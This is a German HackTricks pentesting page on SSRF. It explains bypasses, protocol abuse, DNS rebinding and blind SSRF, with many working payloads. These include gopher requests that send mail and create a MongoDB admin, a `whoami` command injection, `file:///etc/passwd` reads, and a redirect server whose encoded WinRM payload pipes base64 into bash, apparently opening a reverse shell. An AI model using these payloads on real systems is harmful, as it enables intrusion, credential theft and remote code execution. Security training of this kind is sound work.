# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Eine **Server-side Request Forgery (SSRF)**-Schwachstelle tritt auf, wenn ein Angreifer eine **serverseitige Anwendung** dazu manipuliert, **HTTP requests** an eine vom Angreifer gewählte Domain zu senden. Diese Schwachstelle setzt den Server willkürlichen externen Anfragen aus, die vom Angreifer gesteuert werden.

## SSRF erfassen

Das Erste, was Sie tun müssen, ist eine von Ihnen ausgelöste SSRF-Interaktion zu erfassen. Um eine HTTP- oder DNS-Interaktion zu erfassen, können Sie Tools wie die folgenden verwenden:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Umgehung von Whitelist-Domains

Normalerweise werden Sie feststellen, dass die SSRF nur in **bestimmten auf der Whitelist stehenden Domains** oder URLs funktioniert. Auf der folgenden Seite finden Sie eine **Zusammenstellung von Techniken, um diese Whitelist zu umgehen**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Umgehung via Open Redirect

Wenn der Server korrekt geschützt ist, könnten Sie **alle Einschränkungen umgehen, indem Sie einen Open Redirect innerhalb der Webseite ausnutzen**. Da die Webseite wahrscheinlich **SSRF zur gleichen Domain erlaubt** und vermutlich **Redirects folgt**, können Sie den **Open Redirect ausnutzen, damit der Server auf interne Ressourcen zugreift**.\
Mehr dazu hier: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokolle

- **file://**
- Das URL-Schema `file://` wird erwähnt und verweist direkt auf `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Das DICT-URL-Schema wird beschrieben und dient dem Zugriff auf Definitionen oder Wortlisten über das DICT-Protokoll. Ein Beispiel zeigt eine konstruierte URL, die auf ein bestimmtes Wort, eine Datenbank und eine Eintragsnummer abzielt, sowie ein Beispiel, in dem ein PHP-Skript möglicherweise missbraucht wird, um eine Verbindung zu einem DICT-Server mit vom Angreifer bereitgestellten Anmeldeinformationen herzustellen: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identifiziert als Protokoll für sicheren Dateitransfer über Secure Shell; ein Beispiel zeigt, wie ein PHP-Skript ausgenutzt werden könnte, um eine Verbindung zu einem bösartigen SFTP-Server herzustellen: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, das über UDP arbeitet, wird mit einem Beispiel erwähnt, in dem ein PHP-Skript eine Anfrage an einen TFTP-Server sendet. Eine TFTP-Anfrage geht an 'generic.com' auf Port '12346' für die Datei 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Dieser Abschnitt behandelt das Lightweight Directory Access Protocol und betont seine Verwendung zur Verwaltung und zum Zugriff auf verteilte Verzeichnisinformationsdienste über IP-Netzwerke. Interaktion mit einem LDAP-Server auf localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Es wird eine Methode beschrieben, wie SSRF-Schwachstellen ausgenutzt werden können, um mit SMTP-Diensten auf localhost zu interagieren, einschließlich Schritten zur Offenlegung interner Domainnamen und weiteren Untersuchungsmaßnahmen basierend auf diesen Informationen.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Wenn die SSRF von **curl** ausgeführt wird, hat curl eine Funktion namens [**URL globbing**](https://everything.curl.dev/cmdline/globbing), die nützlich sein kann, um WAFs zu umgehen. Zum Beispiel findest du in diesem [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) folgendes Beispiel für einen **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Es wird die Fähigkeit des Gopher-Protokolls beschrieben, IP, port und bytes für die Kommunikation mit einem Server anzugeben, sowie Tools wie [Gopherus](https://github.com/tarunkant/Gopherus) und [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) zum Erstellen von payloads. Zwei verschiedene Verwendungsarten werden illustriert:

### Gopher://

Mit diesem Protokoll kannst du die **IP, port and bytes** angeben, die du möchtest, dass der Server **sendet**. Dann kannst du im Grunde einen SSRF ausnutzen, um mit jedem TCP-Server zu **kommunizieren** (du musst aber vorher wissen, wie man mit dem Dienst spricht).\
Glücklicherweise kannst du [Gopherus](https://github.com/tarunkant/Gopherus) verwenden, um payloads für mehrere Dienste zu erstellen. Zusätzlich kann [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) verwendet werden, um _gopher_ payloads für _Java RMI_ Dienste zu erstellen.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect zu 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Erstelle Benutzer mit username=admin, password=admin123 und permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Andere

Analytics-Software auf Servern protokolliert häufig den Referrer header, um eingehende Links nachzuverfolgen — eine Praxis, die Anwendungen unbeabsichtigt Server-Side Request Forgery (SSRF)-Schwachstellen aussetzt. Das liegt daran, dass solche Software externe URLs besuchen kann, die im Referrer header genannt sind, um Inhalte der verweisenden Seite zu analysieren. Um diese Schwachstellen aufzudecken, empfiehlt sich das Burp Suite plugin "**Collaborator Everywhere**", da es ausnutzt, wie Analytics-Tools den Referer header verarbeiten, um potenzielle SSRF-Angriffsflächen zu identifizieren.

## SSRF via SNI data from certificate

Eine Fehlkonfiguration, die die Verbindung zu beliebigen Backends durch eine einfache Einrichtung ermöglichen könnte, wird mit einem Beispiel einer Nginx-Konfiguration veranschaulicht:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In dieser Konfiguration wird der Wert des Server Name Indication (SNI)-Feldes direkt als Adresse des Backends verwendet. Diese Einrichtung macht anfällig für Server-Side Request Forgery (SSRF), die ausgenutzt werden kann, indem einfach die gewünschte IP-Adresse oder der Domainname im SNI-Feld angegeben wird. Ein Exploit-Beispiel, um eine Verbindung zu einem beliebigen Backend wie `internal.host.com` mit dem `openssl`-Befehl zu erzwingen, ist unten angegeben:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Es kann sich lohnen, eine Nutzlast wie die folgende zu versuchen: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF-Rendering

Wenn die Webseite automatisch ein PDF aus Informationen erstellt, die Sie bereitgestellt haben, können Sie **JS einfügen, das vom PDF-Ersteller selbst** (dem Server) bei der Erstellung des PDFs ausgeführt wird, und so eine SSRF ausnutzen. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Erstellen Sie mehrere Sessions und versuchen Sie, über die Sessions große Dateien herunterzuladen, um die SSRF auszunutzen.

## SSRF PHP Functions

Siehe die folgende Seite nach verwundbaren PHP- und sogar Wordpress-Funktionen:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Für einige Exploit-Szenarien kann es nötig sein, **eine Redirect-Antwort zu senden** (möglicherweise um ein anderes Protokoll wie gopher zu verwenden). Hier sind verschiedene python-Codes, um mit einer Redirect-Antwort zu reagieren:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Fehlkonfigurierte Proxys für SSRF

Tricks [**aus diesem Beitrag**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Verwundbarer Flask-Proxy-Code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask erlaubt die Verwendung von **`@`** als Anfangszeichen, was es ermöglicht, den **anfänglichen Hostnamen als Benutzernamen** zu verwenden und einen neuen einzuschleusen. Angriffsanfrage:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Verwundbarer Code:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Es wurde entdeckt, dass es möglich ist, den Pfad einer Anfrage mit dem Zeichen **`;`** zu beginnen, was anschließend die Nutzung von **`@`** ermöglicht und das Injizieren eines neuen Hosts für den Zugriff erlaubt. Angriffs-Anfrage:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Anfälliger PHP-Code</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP erlaubt die Verwendung des **Zeichens `*` vor einem Slash im Pfad** der URL, hat jedoch weitere Einschränkungen: Es kann nur für den Root-Pfadnamen `/` verwendet werden und Punkte `.` sind vor dem ersten Slash nicht erlaubt, weshalb z. B. eine punktlose hex-kodierte IP-Adresse verwendet werden muss:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Wenn du **Probleme** hast, **exfiltrate content from a local IP** wegen **CORS/SOP**, kann **DNS Rebidding** verwendet werden, um diese Einschränkung zu umgehen:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automatisierte DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ist ein Tool, um **DNS rebinding attacks** durchzuführen. Es enthält die notwendigen Komponenten, um die IP-Adresse des DNS-Namens des Angreifer-Servers auf die IP-Adresse der Zielmaschine umzubinden und attack payloads bereitzustellen, um verwundbare Software auf der Zielmaschine zu exploit-en.

Sieh dir auch den öffentlich laufenden Server an unter [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- Dienste auf lokalen Ports

Attack:

1. Bitte den user/bot, auf eine **domain** zuzugreifen, die vom **attacker** kontrolliert wird.  
2. Die **TTL** des **DNS** steht auf **0** Sekunden (so fragt das Opfer bald erneut die IP der Domain ab).  
3. Zwischen dem Opfer und der Domain des Angreifers wird eine **TLS connection** aufgebaut. Der Angreifer platziert die **payload inside** die **Session ID oder Session Ticket**.  
4. Die **domain** startet eine **infinite loop** von Redirects gegen **sich selbst**. Ziel ist es, den user/bot die Domain so lange aufrufen zu lassen, bis dieser erneut eine **DNS request** für die Domain ausführt.  
5. Bei der DNS-Anfrage wird jetzt eine **private IP** zurückgegeben (z. B. 127.0.0.1).  
6. Der user/bot versucht, die **TLS connection** wiederherzustellen und wird dabei die **Session ID/Ticket** senden (in der die **payload** des Angreifers enthalten war). Herzlichen Glückwunsch — du hast es geschafft, den **user/bot** dich selbst angreifen zu lassen.

Beachte, dass du bei diesem Angriff, wenn du localhost:11211 (_memcache_) angreifen willst, das Opfer die initiale Verbindung mit www.attacker.com:11211 herstellen lassen musst (der **Port muss immer derselbe sein**).\
Um **diesen Angriff durchzuführen** kannst du das Tool verwenden: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Für **mehr Informationen** siehe den Talk, in dem dieser Angriff erklärt wird: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Der Unterschied zwischen einem blind SSRF und einem nicht-blinden besteht darin, dass man beim blind SSRF die Antwort der SSRF-Anfrage nicht sehen kann. Dadurch ist das Ausnutzen schwieriger, weil man meist nur bekannte Vulnerabilities ausnutzen kann.

### Time based SSRF

Durch das **Messen der Zeit** von Serverantworten kann es **möglich sein herauszufinden, ob eine Ressource existiert oder nicht** (vielleicht dauert der Zugriff auf eine existierende Ressource länger als auf eine nicht existierende).

### Vom blinden zum vollständigen Missbrauch von Statuscodes

Laut diesem [**Blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/) können einige blind SSRF auftreten, weil selbst wenn die angefragte URL mit einem 200 Statuscode antwortet (wie z. B. AWS metadata), diese data nicht korrekt formatiert ist und die App sie deshalb ablehnen könnte, anzuzeigen.

Es wurde jedoch festgestellt, dass das Senden bestimmter Redirect-Antworten im Bereich 305 bis 309 im SSRF dazu führen kann, dass die Anwendung diesen Redirects folgt und gleichzeitig in einen Error-Mode wechselt, in dem sie das Datenformat nicht mehr überprüft und diese Daten einfach ausgibt.

Der python server, der verwendet wird, um dies auszunutzen, ist folgender:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Steps:**
- Zuerst veranlasst ein 302, dass die App anfängt zu folgen.
- Dann erhält sie 305 → 306 → 307 → 308 → 309 → 310.
- Nach dem 5. seltsamen Code gibt der PoC schließlich 302 → 169.254.169.254 → 200 OK zurück.

**What happens inside the target:**
- libcurl selbst folgt tatsächlich den Codes 305–310; es normalisiert unbekannte Codes einfach zu „follow“.
- Nach N merkwürdigen Redirects (hier ≥ 5) entscheidet der eigene Wrapper der Anwendung, dass „etwas nicht stimmt“, und wechselt in einen Fehler-Modus, der für Debugging gedacht ist.
- In diesem Modus gibt er die gesamte Redirect-Kette plus den finalen Body an den externen Aufrufer zurück.
- Ergebnis: Der Angreifer sieht jeden Header + das metadata JSON, Mission erfüllt.

Beachte, dass dies interessant ist, um Statuscodes zu leak, die du zuvor nicht leak konntest (wie ein 200). Wenn du jedoch irgendwie auch den Statuscode der Antwort auswählen könntest (stell dir vor, du könntest festlegen, dass die AWS metadata mit einem 500-Statuscode antwortet), **könnten einige Statuscodes den Inhalt der Antwort direkt leak(en).**

### HTML-to-PDF renderers as blind SSRF gadgets

Bibliotheken wie **TCPDF** (und Wrapper wie **spipu/html2pdf**) holen beim Rendern eines PDFs automatisch alle URLs, die im vom Angreifer kontrollierten HTML vorkommen. Jedes `<img>`- oder `<link rel="stylesheet">`-Attribut wird serverseitig via cURL, `getimagesize()`, oder `file_get_contents()` aufgelöst, so dass du den PDF-Worker dazu bringen kannst, interne Hosts zu sondieren, obwohl keine HTTP-Antwort an dich zurückgegeben wird.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 führt mehrere Abrufversuche für jede `<img>`-Ressource aus, sodass eine einzelne payload mehrere requests erzeugen kann (hilfreich für timing-based port scans).
- html2pdf kopiert das Verhalten von TCPDF für `<img>` und fügt CSS-Fetching innerhalb von `Css::extractStyle()` hinzu, das nach einer oberflächlichen Scheme-Prüfung einfach `file_get_contents($href)` aufruft. Missbrauche das, um Loopback-Services, RFC1918-Bereiche oder Cloud-Metadaten-Endpunkte zu erreichen.
- Combine this SSRF primitive with the [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) to leak both internal HTTP responses and local files rendered into the PDF.

Sicherheitsverantwortliche sollten externe URLs vor dem Rendern entfernen oder den Renderer in einer Netzwerksandbox isolieren; bis dahin gelten PDF-Generatoren als blind SSRF-Proxies.

## Cloud-SSRF-Ausnutzung

Wenn du eine SSRF-Schwachstelle in einer Maschine findest, die in einer Cloud-Umgebung läuft, kannst du möglicherweise interessante Informationen über die Cloud-Umgebung und sogar Credentials erhalten:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF-anfällige Plattformen

Mehrere bekannte Plattformen enthalten oder haben SSRF-Schwachstellen gehabt; prüfe sie hier:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool zum Auffinden und Ausnutzen von SSRF-Schwachstellen

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Dieses Tool erzeugt Gopher-Payloads für:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ ist ein _Java RMI_-Schwachstellen-Scanner, der Angriffsoperationen für die meisten gängigen _Java RMI_-Schwachstellen unterstützt. Die meisten verfügbaren Operationen unterstützen die `--ssrf`-Option, um eine _SSRF_-Payload für die gewünschte Operation zu generieren. In Kombination mit der `--gopher`-Option können direkt einsatzbereite _gopher_-Payloads erzeugt werden.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

